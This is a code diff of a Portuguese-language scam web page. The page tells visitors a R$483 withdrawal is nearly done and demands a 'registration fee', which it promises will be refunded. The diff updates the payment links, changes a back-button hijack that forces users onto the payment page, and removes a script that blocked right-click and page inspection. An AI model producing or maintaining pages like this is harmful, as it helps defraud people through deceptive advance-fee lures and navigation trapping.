@@ -43,7 +43,7 @@
                 <label style="background-color: #e2e8ef; padding: 10px; border-radius: 12px; text-align: center; width: 100%; margin-bottom: 10px; font-size: 20px;">O seu saque já está <b>QUASE</b> finalizado!<br><br>Para continuar lucrando dentro do aplicativo e finalizar seu saque de <b>R$483 reais agora!</b><br><br>Pague apenas uma <b>taxa de cadastro.</b><br><br>
                 Mas fique tranquilo, você <b>receberá</b> esse valor na sua conta após o <b>saque!</b></label>
                 <div class="row">
-                    <a style="height: 50px; text-align: center; padding: 10px; font-size: 20px;" href="https://go.perfectpay.com.br/PPU38CNLQPP" class="enviarCodigo">CONCLUIR SAQUE</a>
+                    <a style="height: 50px; text-align: center; padding: 10px; font-size: 20px;" href="https://go.perfectpay.com.br/PPU38CNPNRK" class="enviarCodigo">CONCLUIR SAQUE</a>
                 </div>
             </div>
 
@@ -95,51 +95,12 @@
             history.pushState({}, "", location.href);
             window.onpopstate = function () {
                 setTimeout(function() {
-                    window.location.href = "https://go.perfectpay.com.br/PPU38CNGIM0/?utm_source=cdl_mc";
+                    window.location.href = "https://go.perfectpay.com.br/PPU38CNPNRK";
                 }, 0001);
             };
         </script>
 
-        <script>
-            var message="";
-            function clickIE() {
-                if (document.all) {(message);return false;}
-            }
-            function clickNS(e) {
-                if(document.layers||(document.getElementById&&!document.all)) {
-                    if (e.which==2||e.which==3) {(message);return false;}
-                }
-            }
-            if (document.layers){
-                document.captureEvents(Event.MOUSEDOWN);document.onmousedown=clickNS;
-            }
-            else{
-                document.onmouseup=clickNS;document.oncontextmenu=clickIE;
-            }
-            document.oncontextmenu=new Function("return false")
-
-
-            //  F12
-            //==========
-
-            document.onkeypress = function (event) {
-                if (e.ctrlKey && (e.keyCode === 123)) {
-                    // alert('not allowed');
-                    return false;
-                }
-            };
-
-
-            //    CTRL + u
-            //==============
-
-            document.onkeydown = function(e) {
-                if (e.ctrlKey && (e.keyCode === 85)) {
-                    // alert('not allowed');
-                    return false;
-                }
-            };  
-        </script>
+        
         
         <script>
             $("#tipoChave").change(function() {
